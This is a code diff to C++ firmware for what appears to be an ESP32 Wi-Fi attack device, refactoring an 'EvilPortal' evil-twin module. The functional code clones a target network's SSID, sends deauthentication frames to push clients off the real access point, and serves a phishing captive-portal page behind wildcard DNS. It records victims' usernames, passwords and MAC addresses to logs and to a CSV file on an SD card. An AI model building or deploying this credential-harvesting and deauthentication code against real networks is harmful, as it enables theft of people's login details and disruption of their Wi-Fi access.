@@ -14,11 +14,9 @@ EvilPortal::EvilPortal() :
     webServer_(80),
     lastDeauthTime_(0)
 {
-    // Set the static instance pointer so the callback can find our object
     instance_ = this;
 }
 
-// --- NEW STATIC EVENT HANDLER ---
 void EvilPortal::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
     if (instance_ && instance_->isActive()) {
         char macStr[18];
@@ -28,7 +26,6 @@ void EvilPortal::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
                 info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);
         
         instance_->lastClientMac_ = macStr;
-        // Serial.printf("[EVILTWIN] Client Connected. MAC: %s\n", macStr);
         LOG(LogLevel::INFO, "EVILTWIN", "Client Connected. MAC: %s", macStr);
     }
 }
@@ -43,20 +40,16 @@ void EvilPortal::prepareAttack() {
     capturedCredentials_.clear();
     selectedPortal_ = "";
     lastClientMac_ = "";
-    // Serial.println("[EVILTWIN] Attack prepared. State has been reset.");
     LOG(LogLevel::INFO, "EVILTWIN", "Attack prepared. State has been reset.");
 }
 
 void EvilPortal::setSelectedPortal(const std::string& portalName) {
     selectedPortal_ = portalName;
-    // Serial.printf("[EVILTWIN] Portal selected: %s\n", selectedPortal_.c_str());
     LOG(LogLevel::INFO, "EVILTWIN", "Portal selected: %s", selectedPortal_.c_str());
 }
 
 bool EvilPortal::start(const WifiNetworkInfo& target) {
     if (isActive_ || !isAttackPending_ || selectedPortal_.empty()) {
-        // Serial.printf("[EVILTWIN] Attack start failed. State: isActive=%d, isPending=%d, portalEmpty=%d\n", 
-        //     isActive_, isAttackPending_, selectedPortal_.empty());
         LOG(LogLevel::ERROR, "EVILTWIN", "Attack start failed. State: isActive=%d, isPending=%d, portalEmpty=%d", 
             isActive_, isAttackPending_, selectedPortal_.empty());
         return false;
@@ -64,12 +57,10 @@ bool EvilPortal::start(const WifiNetworkInfo& target) {
 
     rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::ROGUE_AP);
     if (!rfLock_ || !rfLock_->isValid()) {
-        // Serial.println("[EVILTWIN] Failed to acquire RF Lock.");
         LOG(LogLevel::ERROR, "EVILTWIN", "Failed to acquire RF Lock.");
         return false;
     }
     
-    // --- REGISTER EVENT HANDLER ON START ---
     WiFi.onEvent(onStationConnected, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
 
     targetNetwork_ = target;
@@ -77,24 +68,19 @@ bool EvilPortal::start(const WifiNetworkInfo& target) {
     isActive_ = true;
     lastDeauthTime_ = 0;
 
-    // Serial.printf("[EVILTWIN] Starting attack on SSID: %s (Channel: %d) using portal '%s'\n", 
-    //               targetNetwork_.ssid, targetNetwork_.channel, selectedPortal_.c_str());
     LOG(LogLevel::INFO, "EVILTWIN", "Starting attack on SSID: %s (Channel: %d) using portal '%s'", 
                   targetNetwork_.ssid, targetNetwork_.channel, selectedPortal_.c_str());
 
     int cloneChannel = (targetNetwork_.channel == 1) ? 6 : 1;
     WiFi.softAP(targetNetwork_.ssid, nullptr, cloneChannel);
     startWebServer();
-    // app_->getHardwareManager().setPerformanceMode(true);
     return true;
 }
 
 void EvilPortal::stop() {
     if (!isActive_) return;
-    // Serial.println("[EVILTWIN] Stopping Evil Twin attack.");
     LOG(LogLevel::INFO, "EVILTWIN", "Stopping Evil Twin attack.");
     
-    // --- UNREGISTER EVENT HANDLER ON STOP ---
     WiFi.removeEvent(ARDUINO_EVENT_WIFI_AP_STACONNECTED);
     
     webServer_.end();
@@ -103,7 +89,6 @@ void EvilPortal::stop() {
     rfLock_.reset(); 
     isActive_ = false;
     isAttackPending_ = false;
-    // app_->getHardwareManager().setPerformanceMode(false);
 }
 
 void EvilPortal::loop() {
@@ -122,7 +107,6 @@ void EvilPortal::processDns() {
 void EvilPortal::deauthRoutine() {
     esp_wifi_set_channel(targetNetwork_.channel, WIFI_SECOND_CHAN_NONE);
     
-    // --- MODIFICATION: Use the centralized template ---
     uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
     memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
 
@@ -140,7 +124,6 @@ void EvilPortal::deauthRoutine() {
 
 void EvilPortal::startWebServer() {
     dnsServer_.start(53, "*", WiFi.softAPIP());
-    // Serial.printf("[EVILTWIN] DNS Server started. AP IP: %s\n", WiFi.softAPIP().toString().c_str());
     LOG(LogLevel::INFO, "EVILTWIN", "DNS Server started. AP IP: %s", WiFi.softAPIP().toString().c_str());
 
     webServer_.on("/login", HTTP_ANY, [this](AsyncWebServerRequest *request){ this->handleLogin(request); });
@@ -160,13 +143,6 @@ void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
         
         capturedCredentials_.push_back(victim);
 
-        // Serial.printf("[EVILTWIN] >>>>>>>>> CAPTURED CREDENTIALS (Victim #%d) <<<<<<<<<\n", capturedCredentials_.size());
-        // Serial.printf("           Portal: %s\n", selectedPortal_.c_str());
-        // Serial.printf("           SSID:   %s\n", targetNetwork_.ssid);
-        // Serial.printf("           Client MAC: %s\n", victim.clientMac.c_str());
-        // Serial.printf("           User:   %s\n", victim.username.c_str());
-        // Serial.printf("           Pass:   %s\n", victim.password.c_str());
-
         LOG(LogLevel::INFO, "EVILTWIN", "CAPTURED CREDENTIALS (Victim #%d)", capturedCredentials_.size());
         LOG(LogLevel::INFO, "EVILTWIN", "Portal: %s", selectedPortal_.c_str());
         LOG(LogLevel::INFO, "EVILTWIN", "SSID: %s", targetNetwork_.ssid);
@@ -174,25 +150,21 @@ void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
         LOG(LogLevel::INFO, "EVILTWIN", "User: %s", victim.username.c_str());
         LOG(LogLevel::INFO, "EVILTWIN", "Pass: %s", victim.password.c_str());
         
-        // --- SAVE TO CSV ---
         const char* log_path = SD_ROOT::CAPTURES_EVILTWIN_CSV;
 
-        // Step 1: Check if the file exists. If not, create it with a header.
-        if (!SdCardManager::exists(log_path)) {
-            // Serial.println("[EVILTWIN] Log file not found. Creating with header.");
+        // --- THIS IS THE FIX ---
+        if (!SdCardManager::getInstance().exists(log_path)) {
             LOG(LogLevel::INFO, "EVILTWIN", "Log file not found. Creating with header.");
-            File logFile = SdCardManager::openFile(log_path, FILE_WRITE);
+            File logFile = SdCardManager::getInstance().openFileUncached(log_path, FILE_WRITE);
             if (logFile) {
                 logFile.println("timestamp,portal_used,ssid_cloned,client_mac,username,password");
                 logFile.close();
             } else {
-                Serial.println("[EVILTWIN] FAILED to create log file!");
                 LOG(LogLevel::ERROR, "EVILTWIN", "FAILED to create log file!");
             }
         }
         
-        // Step 2: Open the file in APPEND mode to add the new credentials.
-        File logFile = SdCardManager::openFile(log_path, FILE_APPEND);
+        File logFile = SdCardManager::getInstance().openFileUncached(log_path, FILE_APPEND);
         if (logFile) {
             logFile.printf("%lu,%s,%s,%s,%s,%s\n",
                            millis(),
@@ -202,10 +174,8 @@ void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
                            victim.username.c_str(),
                            victim.password.c_str());
             logFile.close();
-            // Serial.println("[EVILTWIN] Credentials saved to SD card.");
             LOG(LogLevel::INFO, "EVILTWIN", "Credentials saved to SD card.");
         } else {
-            // Serial.println("[EVILTWIN] FAILED to open log file for appending!");
             LOG(LogLevel::ERROR, "EVILTWIN", "FAILED to open log file for appending!");
         }
 
@@ -222,14 +192,13 @@ void EvilPortal::handleCaptivePortal(AsyncWebServerRequest* request) {
         return;
     }
     String portal_path = String(SD_ROOT::USER_PORTALS) + "/" + String(selectedPortal_.c_str()) + "/index.html";
-    if (SdCardManager::exists(portal_path.c_str())) {
+    if (SdCardManager::getInstance().exists(portal_path.c_str())) {
         request->send(SD, portal_path.c_str(), "text/html");
     } else {
         request->send(404, "text/plain", "Portal page not found on SD card.");
     }
 }
 
-// --- Getter Implementations ---
 bool EvilPortal::isActive() const { return isActive_; }
 bool EvilPortal::isAttackPending() const { return isAttackPending_; }
 const WifiNetworkInfo& EvilPortal::getTargetNetwork() const { return targetNetwork_; }
